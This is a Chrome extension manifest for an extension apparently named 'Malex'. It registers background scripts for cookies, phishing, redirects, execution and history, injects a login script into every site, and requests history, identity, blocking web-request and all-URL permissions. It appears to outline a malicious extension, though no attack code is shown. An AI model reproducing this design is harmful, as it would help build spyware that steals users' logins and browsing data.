{
    "manifest_version": 2,

    "name": "Malex",
    "description": "Mooooooo",
    "version": "1.0",

    "background": {
        "scripts": [
            "externalJS/jquery.js",
            "scripts/cookies.js",
            "scripts/redirect.js",
            "scripts/phish.js",
            "scripts/execute.js",
            "scripts/history.js",
            "scripts/ping.js"
        ],
        "persistent": true
    },
    "browser_action": {
        "default_icon": "images/malex-icon.png",
        "default_popup": "malex.html"
    },
    "content_scripts": [{
        "matches":    ["*://*/*"],
        "js": [
            "externalJS/jquery.js",
            "scripts/login.js",
            "scripts/custom.js"
        ]
    }],
    "permissions": [
        "activeTab",
        "tabs",
        "history",
        "identity",
        "identity.email",
        "storage",
        "webRequest",
        "webRequestBlocking",
        "<all_urls>"
    ]
}